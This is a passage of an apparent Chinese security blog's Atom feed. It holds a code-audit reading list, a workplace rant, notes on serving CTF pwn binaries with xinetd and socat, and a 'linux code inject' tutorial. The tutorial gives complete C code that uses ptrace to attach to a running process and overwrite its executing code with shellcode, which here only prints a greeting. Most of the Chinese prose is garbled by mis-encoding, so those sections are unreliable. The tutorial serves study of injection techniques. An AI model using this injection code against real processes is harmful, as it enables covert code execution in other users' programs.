<p><a href="https://github.com/jerryscript-project/jerryscript.git" target="_blank" rel="noopener">https://github.com/jerryscript-project/jerryscript.git</a></p>
<ul>
<li>Espruino (MPL v2.0) </li>
</ul>
<p>ç»™åµŒå…¥å¼è®¾å¤‡ç”¨çš„ï¼Œå¾ˆå° </p>
<ul>
<li>MuJS (Affero GPL) </li>
</ul>
<p>å¾ˆå° demoç±»å‹ </p>
<ul>
<li>quad-wheel (MIT License) </li>
</ul>
<ul>
<li>v7 (GPL v2.0) </li>
</ul>
<p>å‡†å¤‡å…ˆçœ‹tiny jsï¼Œä»æœ€å°çš„å¼€å§‹ï¼Œåé¢çœ‹ä¸€ä¸ªç¨å¾®å¤§ä¸€ç‚¹çš„ 2 æˆ–è€…3 è¿™æ ·çš„ã€‚ </p>
<h5 id="æ–‡ä»¶æ ¼å¼ç±»"><a href="#æ–‡ä»¶æ ¼å¼ç±»" class="headerlink" title="æ–‡ä»¶æ ¼å¼ç±»"></a>æ–‡ä»¶æ ¼å¼ç±»</h5><p>ä¸€äº›å°å‹çš„æ ¼å¼è§£æåº“ã€è½¯ä»¶ </p>
<ul>
<li>Xml : tinyXML / rapidxml </li>
</ul>
<ul>
<li>PDF : mupdf / pdfium </li>
</ul>
<h4 id="0x02-å·²è¯»"><a href="#0x02-å·²è¯»" class="headerlink" title="0x02 : å·²è¯»"></a>0x02 : å·²è¯»</h4><ul>
<li>tiny-js</li>
</ul>
<p>å°±æ˜¯ä¸ªdemo js engineï¼Œæ”¯æŒçš„ä¸œè¥¿ä¹Ÿå¾ˆåŸºæœ¬ï¼Œå°±æ˜¯è§£æåˆ°tokenåºåˆ—ï¼Œç„¶å case TOKENï¼Œç„¶åèµ°ä¸åŒçš„æ‰§è¡Œæµï¼Œæ‰§è¡Œjs codeã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª&quot;&gt;&lt;a href=&quot;#0x00-ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª&quot; class=&quot;headerlink&quot; title=&quot;0x00 : ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª&quot;&gt;&lt;/a&gt;0x00 : ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª&lt;/h4&gt;&lt;p&gt;å› ä¸ºæˆ‘èœå•Šï¼Œè€Œä¸”æˆ‘æƒ³å­¦ä»£ç å®¡è®¡å•Šã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>é£æ‰¬å†é™©è®°</title>
    <link href="http://o0xmuhe.me/2018/08/13/%E9%A3%9E%E6%89%AC%E5%8E%86%E9%99%A9%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/08/13/é£æ‰¬å†é™©è®°/</id>
    <published>2018-08-13T08:58:43.000Z</published>
    <updated>2018-08-26T08:05:19.708Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ•…äº‹çº¯å±è™šæ„ï¼Œå¦‚æœ‰é›·åŒï¼Œé‚£å°±é›·åŒå§ã€‚</p>
<a id="more"></a>
<ol>
<li><p>é£ä¹‹å‰ï¼Œå·¥ä½œåœ°ååˆ†å¼€å¿ƒï¼Œèƒ½æ„Ÿå—åˆ°è‡ªå·±æ¯å¤©åœ¨è¿›æ­¥ï¼Œåæ­£å°±æ˜¯å·¥ä½œçš„å¾ˆå¼€å¿ƒã€‚</p>
</li>
<li><p>è‡ªä»å…«æœˆå…­å·ä¹‹åï¼Œä¸€åˆ‡éƒ½å˜äº†ï¼Œæˆ‘å¼€å§‹å˜å¾—è´Ÿèƒ½é‡çˆ†æ£šï¼Œéª‚è¡—çš„é¢‘ç‡ä¹Ÿé™¡ç„¶å‡é«˜ã€‚</p>
</li>
<li><p>æ¯å¤©9ç‚¹å¤šåˆ°ï¼Œæ™šä¸Šä¸çŸ¥é“å‡ ç‚¹æ‰èƒ½èµ°ï¼Œæœ€æ—©çš„ä¸€æ¬¡åä¸€ç‚¹å››åï¼Œæœ€æ™šçš„ä¸€æ¬¡å‡Œæ™¨ä¸¤ç‚¹å¤šã€‚å¸ƒç½®é‚£ä¹ˆå¤šä¸œè¥¿ï¼Œåƒå¹¼å„¿å›­å°æœ‹å‹ä¸€æ ·çš„æ´»åŠ¨ï¼ŒçœŸçš„æ˜¯æ²¡å•¥æ„ä¹‰ã€‚</p>
</li>
<li><p>åŠä¸ªæœˆçš„æ—¶é—´ï¼Œè€½è¯¯äº†å¾ˆå¤šå·¥ä½œï¼Œå†æ¬¡å›åˆ°å·¥ä½œä¸­ï¼Œæœ‰äº›ä¸é€‚åº”å§ï¼ŒèŠ±äº†ç‚¹æ—¶é—´å»åŒæ­¥ã€é€‚åº”ï¼Œå¤ªè ¢äº†è¿™ä¸ªä¸œè¥¿ã€‚</p>
</li>
<li><p>è®©æˆ‘æƒ…ç»ªæ¯”è¾ƒçˆ†å‘çš„è¿˜æ˜¯åå‡ å¤©ä¸­ï¼Œä¸€ä¸ªå¦¹å­çš„äº‹ï¼Œè¿‡æ•+ä¸Šå‘¼å¸é“æ„ŸæŸ“ï¼Œè¯·å‡å±…ç„¶ä¸å…è®¸ï¼Œè¿˜å¼ºè¡Œè®©äººå®¶å»è„±å£ç§€è®²è¯ï¼Œä¹‹åè¿˜è¯´ä¸åˆæ ¼ï¼Œåå¤©å†æ¥ã€‚çœŸçš„æ˜¯ç‰›é€¼åˆ°ä¸è¡Œã€‚ ä½ ä»¬æ˜¯çœŸçš„éƒ½ä¸ä¼šç”Ÿç—…ï¼Œé“äººï¼Œå¾ˆå‰å®³ï¼Œå¸Œæœ›ä½ ä»¬ç”Ÿç—…çš„æ—¶å€™ä¹Ÿèƒ½åšæŒåšæŒå†åšæŒã€‚</p>
</li>
<li><p>åé¢è¿˜å‘ç”Ÿäº†ç”¨æ‰‹æ‚èµ·äººå®¶ç”µè„‘å±å¹•ï¼Œæ‘”çš„é‚£ç§æ–¹å¼åˆä¸Šå¹¶æ”¶èµ°çš„äº‹ï¼Œä½œä¸ºä¸€ä¸ªITğŸ¶ï¼Œè¿™ä¸ªçœŸçš„ä¸èƒ½å¿ï¼Œé—®å€™ä¸€ä¸‹ä»–å…¨å®¶ã€‚</p>
</li>
<li><p>æŒºæç¬‘çš„ä¸€ä»¶äº‹ï¼Œå®ä¹ ç”Ÿåˆšæ¥å°±åŠä¸ªæœˆè¿™ä¹ˆé™ªç€ä¸€èµ·ç†¬ï¼Œæœ€åä¸€å¤©ç»“æŸçš„æ—¶å€™ï¼Œé¢†å¯¼è¯´å‡ å¥â€œæ„Ÿäººâ€çš„è¯â€¦å…„å¼Ÿï¼Œç°å®ç‚¹ï¼ŒåŠ ç­è´¹ã€‚</p>
</li>
</ol>
<p>æœ€åï¼ŒçœŸçš„å¾ˆæ— èŠï¼Œ<strong>è‡ªåŠ©éš¾åƒçš„ä¸€æ‰¹</strong>ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬æ•…äº‹çº¯å±è™šæ„ï¼Œå¦‚æœ‰é›·åŒï¼Œé‚£å°±é›·åŒå§ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="æ„Ÿæ‚Ÿ" scheme="http://o0xmuhe.me/tags/%E6%84%9F%E6%82%9F/"/>
    
  </entry>
  
  <entry>
    <title>linux code inject</title>
    <link href="http://o0xmuhe.me/2018/06/16/linux-code-inject/"/>
    <id>http://o0xmuhe.me/2018/06/16/linux-code-inject/</id>
    <published>2018-06-16T07:21:25.000Z</published>
    <updated>2018-06-16T07:28:14.218Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-åŸºç¡€"><a href="#0x00-åŸºç¡€" class="headerlink" title="0x00 : åŸºç¡€"></a>0x00 : åŸºç¡€</h4><p>äº§ç”Ÿä¸€ä¸ªæ–°çš„è¿›ç¨‹çš„æ–¹å¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys_clone â€“ creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);</span><br><span class="line">sys_execve â€“ replaces the running process with a new one (has several variations in the C library);</span><br><span class="line">fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel).</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h4 id="0x01-å®ä¾‹"><a href="#0x01-å®ä¾‹" class="headerlink" title="0x01 : å®ä¾‹"></a>0x01 : å®ä¾‹</h4><p>ç›®æ ‡ç¨‹åºä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"counter:%d\n"</span>,i);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨å…¥ç¨‹åºä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * laddr;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        data.val=ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> traced_process;</span><br><span class="line">    <span class="keyword">struct</span> user_regs_struct regs,newregs;</span><br><span class="line">    <span class="keyword">long</span> ins;</span><br><span class="line">    <span class="keyword">int</span> k,h;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">41</span>;</span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">"\xeb\x15\x5e\xb8\x04\x00\x00\x00"</span></span><br><span class="line">                        <span class="string">"\xbb\x02\x00\x00\x00\x89\xf1\xba"</span></span><br><span class="line">                        <span class="string">"\x0c\x00\x00\x00\xcd\x80\xcc\xe8"</span></span><br><span class="line">                        <span class="string">"\xe6\xff\xff\xff\x48\x65\x6c\x6c"</span></span><br><span class="line">                        <span class="string">"\x6f\x20\x57\x6f\x72\x6c\x64\x0a\x00"</span>;</span><br><span class="line">    <span class="keyword">char</span> backup[len];</span><br><span class="line">    <span class="keyword">long</span> addr;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"command input error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//attach to process </span></span><br><span class="line">    ptrace(PTRACE_ATTACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//get curren regs</span></span><br><span class="line">    ptrace(PTRACE_GETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//print eip</span></span><br><span class="line">    ins = ptrace(PTRACE_PEEKTEXT,traced_process,regs.eip,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"EIP:%lx instruction executed: %lx\n"</span>,regs.eip,ins);</span><br><span class="line">    getdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    <span class="comment">//print code</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"backup is :\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,backup[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    putdata(traced_process,regs.eip,shellcode,len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"shellcode is :\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,shellcode[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="comment">//re-set args</span></span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//back</span></span><br><span class="line">    ptrace(PTRACE_CONT,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait for change</span></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press the enter key to continue\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">//recover the code</span></span><br><span class="line">    putdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"excute origion code\n"</span>);</span><br><span class="line">    ptrace(PTRACE_DETACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x02-æ•ˆæœ"><a href="#0x02-æ•ˆæœ" class="headerlink" title="0x02 : æ•ˆæœ"></a>0x02 : æ•ˆæœ</h4><p><img src="http://blogimg-10065924.cossh.myqcloud.com/linux_code_inject/1.jpg" alt="res"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-åŸºç¡€&quot;&gt;&lt;a href=&quot;#0x00-åŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;0x00 : åŸºç¡€&quot;&gt;&lt;/a&gt;0x00 : åŸºç¡€&lt;/h4&gt;&lt;p&gt;äº§ç”Ÿä¸€ä¸ªæ–°çš„è¿›ç¨‹çš„æ–¹å¼&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sys_clone â€“ creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sys_execve â€“ replaces the running process with a new one (has several variations in the C library);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel).&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://o0xmuhe.me/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>æ¯”èµ›è¿ç»´æ‚è®°</title>
    <link href="http://o0xmuhe.me/2018/06/16/%E6%AF%94%E8%B5%9B%E8%BF%90%E7%BB%B4%E6%9D%82%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/06/16/æ¯”èµ›è¿ç»´æ‚è®°/</id>
    <published>2018-06-16T07:12:09.000Z</published>
    <updated>2018-06-16T07:19:41.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 : å‰è¨€"></a>0x00 : å‰è¨€</h2><p>åˆæ˜¯ä¸€å±Šæ ¡èµ›äº†ã€‚å­¦å¼Ÿåœ¨é…ç¯å¢ƒçš„æ—¶å€™ä¸€ç›´é—®æˆ‘ç›¸å…³çš„é—®é¢˜ï¼Œç„¶è€Œæˆ‘ä»¥å‰çš„ç¬”è®°æ‰¾ä¸åˆ°äº†ï¼Œä»Šå¤©å¶ç„¶æ‰¾åˆ°äº†ï¼Œç´¢æ€§ç›´æ¥å‘å‡ºæ¥å§ã€‚è¿™æ˜¯ç¬¬ä¸€æ¬¡å‚åŠ æ ¡èµ›æ—¶å€™é…ç¯å¢ƒçš„è®°å½•äº†ï¼Œä¸¤å¹´å‰å§ï¼Œæ¯”è¾ƒnaiveï¼Œæœ‰å¾ˆå¤šåœ°æ–¹ä¸å…¨é¢ã€‚</p>
<a id="more"></a>
<h2 id="0x01-åŸºæœ¬ä¿¡æ¯"><a href="#0x01-åŸºæœ¬ä¿¡æ¯" class="headerlink" title="0x01 åŸºæœ¬ä¿¡æ¯"></a>0x01 åŸºæœ¬ä¿¡æ¯</h2><p>æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯<code>uname -a</code> æˆ–è€… <code>cat /proc/version</code><br>æŸ¥çœ‹<code>centOS</code> ç³»ç»Ÿç‰ˆæœ¬ <code>rpm -q centos-release</code></p>
<h2 id="0x02-æ›´æ–°-centOSä¸ºä¾‹"><a href="#0x02-æ›´æ–°-centOSä¸ºä¾‹" class="headerlink" title="0x02 æ›´æ–°(centOSä¸ºä¾‹)"></a>0x02 æ›´æ–°(centOSä¸ºä¾‹)</h2><h3 id="1-å¤‡ä»½"><a href="#1-å¤‡ä»½" class="headerlink" title="1.å¤‡ä»½"></a>1.å¤‡ä»½</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>
<h3 id="2-ä¸‹è½½yumé…ç½®æ–‡ä»¶"><a href="#2-ä¸‹è½½yumé…ç½®æ–‡ä»¶" class="headerlink" title="2.ä¸‹è½½yumé…ç½®æ–‡ä»¶"></a>2.ä¸‹è½½yumé…ç½®æ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d/ </span><br><span class="line">wget http://mirrors.163.com/.help/CentOS6-Base-163.repo</span><br></pre></td></tr></table></figure>
<h3 id="3-ç”Ÿæˆç¼“å­˜"><a href="#3-ç”Ÿæˆç¼“å­˜" class="headerlink" title="3.ç”Ÿæˆç¼“å­˜"></a>3.ç”Ÿæˆç¼“å­˜</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
<h3 id="4-æ›´æ–°"><a href="#4-æ›´æ–°" class="headerlink" title="4.æ›´æ–°"></a>4.æ›´æ–°</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
<p>å®‰è£…32ä½åº“ </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install xulrunner.i686</span><br></pre></td></tr></table></figure>
<h2 id="0x03-å®ˆæŠ¤è¿›ç¨‹çš„é…ç½®"><a href="#0x03-å®ˆæŠ¤è¿›ç¨‹çš„é…ç½®" class="headerlink" title="0x03 å®ˆæŠ¤è¿›ç¨‹çš„é…ç½®"></a>0x03 å®ˆæŠ¤è¿›ç¨‹çš„é…ç½®</h2><h3 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1.å®‰è£…"></a>1.å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd</span><br></pre></td></tr></table></figure>
<h3 id="2-é…ç½®"><a href="#2-é…ç½®" class="headerlink" title="2.é…ç½®"></a>2.é…ç½®</h3><p><code>/etc/services</code> ä¸‹å…ˆæ·»åŠ è‡ªå·±çš„æœåŠ¡ç«¯å£ä¿¡æ¯<br><code>/etc/xinetd.d/</code> ä¸‹æ·»åŠ è‡ªå·±çš„æœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">service pwn_test</span><br><span class="line">&#123;</span><br><span class="line">    disable = no //æ‰“å¼€</span><br><span class="line">    port = 50001 </span><br><span class="line">    socket_type = stream</span><br><span class="line">    server = /home/pwn100/pwn100</span><br><span class="line">    wait = no </span><br><span class="line">    user = pwn_user</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åé‡å¯æœåŠ¡å°±å¥½äº†<code>service xinetd restart</code></p>
<h2 id="0x04-socat"><a href="#0x04-socat" class="headerlink" title="0x04 socat"></a>0x04 socat</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget â€“no-cache http://www.convirture.com/repos/definitions/rhel/6.x/convirt.repo -O /etc/yum.repos.d/convirt.repo </span><br><span class="line">yum makecache</span><br><span class="line">yum install socat</span><br></pre></td></tr></table></figure>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>å¦‚æœè¦socatå»é…ç½®pwnæœåŠ¡ï¼Œå†™ä¸€ä¸ªbashè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup socat TCP4-LISTEN:10001,fork EXEC:./pwn100 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>ç»™xæƒé™åè¿è¡Œå³å¯</p>
